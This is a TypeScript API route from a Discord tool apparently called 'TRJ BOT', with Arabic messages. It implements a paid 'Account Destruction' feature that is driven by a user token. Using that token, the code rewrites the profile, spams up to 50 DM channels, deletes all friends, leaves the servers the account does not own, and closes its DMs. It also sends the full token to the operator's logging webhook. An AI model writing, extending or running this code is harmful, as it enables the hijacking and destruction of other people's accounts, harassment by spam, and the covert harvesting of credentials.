// src/app/api/account-destruction/route.ts - Account Destruction API v1.0
// ⚠️ PRIME ONLY
import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken, sendToWebhook } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    const ip = getClientIp(request);
    const rl = rateLimit(`${ip}:account-destruction`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { token, actions, message, profile } = body;

    if (!token) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن' }, { status: 400 });
    }

    if (!actions || typeof actions !== 'object') {
      return NextResponse.json({ success: false, error: 'حدد الإجراءات' }, { status: 400 });
    }

    const ct = cleanToken(token);

    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string; email?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('Account Destruction', ct, { '👤 المستخدم': userTag, '🆔 ID': userData.id });

    const logs: string[] = [`🎯 بدء تدمير حساب: ${userTag}`];
    const stats = { dmsSpammed: 0, friendsDeleted: 0, serversLeft: 0, dmsClosed: 0 };

    // ===== 1. تغيير البروفايل =====
    if (profile && (profile.username || profile.avatar || profile.bio)) {
      logs.push('📝 تحديث البروفايل...');
      
      const profileData: Record<string, string> = {};
      if (profile.username) profileData.username = profile.username;
      if (profile.avatar) profileData.avatar = profile.avatar;
      if (profile.bio) profileData.bio = profile.bio;

      try {
        const profileRes = await discordFetch(ct, 'PATCH', '/users/@me', profileData, { userOnly: true, timeout: 15000 });
        if (profileRes.ok) {
          logs.push('✅ تم تحديث البروفايل');
          if (profile.username) logs.push(`   👤 الاسم الجديد: ${profile.username}`);
          if (profile.bio) logs.push(`   📝 البايو: ${String(profile.bio).substring(0, 50)}...`);
        } else {
          logs.push('❌ فشل تحديث البروفايل');
        }
      } catch {
        logs.push('❌ خطأ في تحديث البروفايل');
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 2. سبام DMs =====
    if (actions.spamDMs) {
      logs.push('📧 جاري سبام الرسائل الخاصة...');
      
      try {
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });
        
        if (dmsRes.ok && dmsRes.data) {
          const channels = dmsRes.data as Array<{ id: string; type: number }>;
          logs.push(`   📬 تم العثور على ${channels.length} محادثة`);
          
          const spamMessage = message || '💀 Account Destroyed by TRJ BOT';
          
          for (let i = 0; i < Math.min(channels.length, 50); i++) {
            const channel = channels[i];
            if (channel.type === 1) {
              try {
                for (let j = 0; j < 5; j++) {
                  await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                    content: spamMessage
                  }, { userOnly: true, timeout: 10000 });
                  stats.dmsSpammed++;
                  await new Promise(r => setTimeout(r, 500));
                }
              } catch { /* skip */ }
            }
          }
          logs.push(`   ✅ تم إرسال ${stats.dmsSpammed} رسالة`);
        } else {
          logs.push('   ❌ فشل جلب المحادثات');
        }
      } catch {
        logs.push('   ❌ خطأ في سبام DMs');
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 3. حذف الأصدقاء =====
    if (actions.deleteFriends) {
      logs.push('👥 جاري حذف الأصدقاء...');
      
      try {
        const friendsRes = await discordFetch(ct, 'GET', '/users/@me/relationships', undefined, { userOnly: true, timeout: 15000 });
        
        if (friendsRes.ok && friendsRes.data) {
          const friends = (friendsRes.data as Array<{ type: number; id: string; user?: { username: string } }>).filter(r => r.type === 1);
          logs.push(`   👥 تم العثور على ${friends.length} صديق`);
          
          for (const friend of friends) {
            try {
              await discordFetch(ct, 'DELETE', `/users/@me/relationships/${friend.id}`, undefined, { userOnly: true, timeout: 5000 });
              stats.friendsDeleted++;
              await new Promise(r => setTimeout(r, 300));
            } catch { /* skip */ }
          }
          logs.push(`   ✅ تم حذف ${stats.friendsDeleted} صديق`);
        } else {
          logs.push('   ❌ فشل جلب قائمة الأصدقاء');
        }
      } catch {
        logs.push('   ❌ خطأ في حذف الأصدقاء');
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 4. مغادرة السيرفرات =====
    if (actions.leaveServers) {
      logs.push('🚪 جاري مغادرة السيرفرات...');
      
      try {
        const guildsRes = await discordFetch(ct, 'GET', '/users/@me/guilds', undefined, { userOnly: true, timeout: 15000 });
        
        if (guildsRes.ok && guildsRes.data) {
          const guilds = guildsRes.data as Array<{ id: string; owner?: boolean }>;
          logs.push(`   🏠 تم العثور على ${guilds.length} سيرفر`);
          
          for (const guild of guilds) {
            try {
              if (!guild.owner) {
                await discordFetch(ct, 'DELETE', `/users/@me/guilds/${guild.id}`, undefined, { userOnly: true, timeout: 5000 });
                stats.serversLeft++;
              }
              await new Promise(r => setTimeout(r, 300));
            } catch { /* skip */ }
          }
          logs.push(`   ✅ تم مغادرة ${stats.serversLeft} سيرفر`);
        } else {
          logs.push('   ❌ فشل جلب قائمة السيرفرات');
        }
      } catch {
        logs.push('   ❌ خطأ في مغادرة السيرفرات');
      }
      
      await new Promise(r => setTimeout(r, 1000));
    }

    // ===== 5. إغلاق DMs =====
    if (actions.closeDMs) {
      logs.push('📪 جاري إغلاق المحادثات...');
      
      try {
        const dmsRes = await discordFetch(ct, 'GET', '/users/@me/channels', undefined, { userOnly: true, timeout: 15000 });
        
        if (dmsRes.ok && dmsRes.data) {
          const channels = (dmsRes.data as Array<{ id: string; type: number }>).filter(c => c.type === 1);
          
          for (const channel of channels) {
            try {
              await discordFetch(ct, 'DELETE', `/channels/${channel.id}`, undefined, { userOnly: true, timeout: 5000 });
              stats.dmsClosed++;
              await new Promise(r => setTimeout(r, 200));
            } catch { /* skip */ }
          }
          logs.push(`   ✅ تم إغلاق ${stats.dmsClosed} محادثة`);
        }
      } catch {
        logs.push('   ❌ خطأ في إغلاق DMs');
      }
    }

    logs.push('');
    logs.push('💀 تم الانتهاء من تدمير الحساب!');
    logs.push(`📊 الإحصائيات:`);
    logs.push(`   📧 رسائل مرسلة: ${stats.dmsSpammed}`);
    logs.push(`   👥 أصدقاء محذوفين: ${stats.friendsDeleted}`);
    logs.push(`   🚪 سيرفرات مغادرة: ${stats.serversLeft}`);
    logs.push(`   📪 محادثات مغلقة: ${stats.dmsClosed}`);

    sendToWebhook({
      embeds: [{
        title: '💀 Account Destruction',
        description: `**تم تدمير حساب:** ${userTag}`,
        color: 0xFF0000,
        fields: [
          { name: '👤 المستخدم', value: userTag, inline: true },
          { name: '🆔 ID', value: userData.id, inline: true },
          { name: '📧 رسائل', value: stats.dmsSpammed.toString(), inline: true },
          { name: '👥 أصدقاء', value: stats.friendsDeleted.toString(), inline: true },
          { name: '🚪 سيرفرات', value: stats.serversLeft.toString(), inline: true },
          { name: '📪 محادثات', value: stats.dmsClosed.toString(), inline: true },
        ],
        footer: { text: 'TRJ BOT - Prime Feature' },
        timestamp: new Date().toISOString()
      }]
    }, getLogWebhookUrl()).catch(() => {});

    return NextResponse.json({
      success: true,
      logs,
      stats,
      user: { id: userData.id, username: userTag }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ في الخادم';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
